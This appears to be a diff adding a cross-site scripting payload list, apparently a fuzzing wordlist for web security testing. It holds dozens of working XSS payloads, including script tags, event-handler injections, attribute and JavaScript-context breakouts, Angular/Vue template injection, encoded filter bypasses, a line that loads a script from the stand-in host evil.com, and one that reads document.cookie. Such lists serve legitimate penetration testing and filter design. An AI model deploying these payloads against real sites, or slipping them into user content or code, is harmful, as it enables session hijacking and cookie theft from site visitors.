@@ -1,0 +1,87 @@
+# XSS Payloads
+
+# Basic script tags
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>alert(document.domain)</script>
+<script>alert(document.cookie)</script>
+<script src=//evil.com/x.js></script>
+<script/src=data:,alert(1)>
+
+# Event handlers
+<img src=x onerror=alert(1)>
+<img src=x onerror="alert(1)">
+<img/src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<body onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<input onblur=alert(1) autofocus><input autofocus>
+<marquee onstart=alert(1)>
+<video><source onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<details open ontoggle=alert(1)>
+<select onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+
+# Iframe and object
+<iframe src=javascript:alert(1)>
+<iframe src="data:text/html,<script>alert(1)</script>">
+<object data=javascript:alert(1)>
+<embed src=javascript:alert(1)>
+
+# Breaking out of attributes
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+'><img src=x onerror=alert(1)>
+" onmouseover="alert(1)
+' onmouseover='alert(1)'
+" onfocus="alert(1)" autofocus="
+' onfocus='alert(1)' autofocus='
+" onclick="alert(1)
+' onclick='alert(1)'
+
+# JavaScript context
+'-alert(1)-'
+"-alert(1)-"
+';alert(1)//
+";alert(1)//
+\';alert(1)//
+\";alert(1)//
+</script><script>alert(1)</script>
+
+# URL context
+javascript:alert(1)
+data:text/html,<script>alert(1)</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+
+# Template injection (Angular, Vue, etc.)
+{{constructor.constructor('alert(1)')()}}
+{{$on.constructor('alert(1)')()}}
+${alert(1)}
+#{alert(1)}
+
+# Filter bypass
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<SCRIPT>alert(1)</SCRIPT>
+<ScRiPt>alert(1)</sCrIpT>
+<script>alert`1`</script>
+<img src=x onerror=alert`1`>
+<svg/onload=alert`1`>
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
+<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>
+%3Cscript%3Ealert(1)%3C/script%3E
+
+# DOM-based
+<img src=x onerror="eval(atob('YWxlcnQoMSk='))">
+<img src=x onerror="Function('alert(1)')()">
+<img src=x onerror="[].constructor.constructor('alert(1)')()">
+
+# SVG-based
+<svg><script>alert(1)</script></svg>
+<svg><script>alert&#40;1&#41;</script></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>
+
+# Math/text elements
+<math><mtext><script>alert(1)</script></mtext></math>
